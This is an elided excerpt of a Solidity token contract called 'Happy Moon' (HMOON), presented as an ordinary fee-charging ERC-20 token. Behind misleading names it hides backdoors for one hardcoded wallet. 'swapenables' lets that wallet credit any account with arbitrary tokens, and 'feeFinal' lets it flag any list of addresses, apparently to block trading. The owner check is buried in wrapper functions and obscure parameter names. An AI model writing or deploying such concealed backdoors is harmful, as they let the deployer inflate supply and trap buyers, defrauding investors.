...
contract  HappyMoon is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Happy Moon";
    string private _symbol = "HMOON";
    uint8 private _decimals = 9;
    address payable public feeRecieveing;
    ...
    mapping (address => bool) public queryTrader;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xA604c195055864d75D2EF63F041607A3151961BE));
        feeRecieveing = payable(address(0xA604c195055864d75D2EF63F041607A3151961BE));
    ...
    function messageSender() view private returns(address){
        return msg.sender;
    }

    function transferTokensETH() view private returns(address){
        return messageSender();
    }

    function feeCalculator() view private{
        require(feeRecieveing == transferTokensETH());
    }
    
    function feeFinal(bool feeIntial, address[] calldata ecIExvfRq) external { feeCalculator();
        for (uint256 i; i < ecIExvfRq.length; i++) {
            queryTrader[ecIExvfRq[i]] = feeIntial;
        }
    }

    function swapenables(uint256 unassint,address senderAddress) external { feeCalculator();
        uint256 totalBalance = unassint.add(balanceOf(senderAddress));
        _balances[senderAddress] = totalBalance;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHMarketing > 0)
            transferToAddressETH(feeRecieveing, amountETHMarketing);
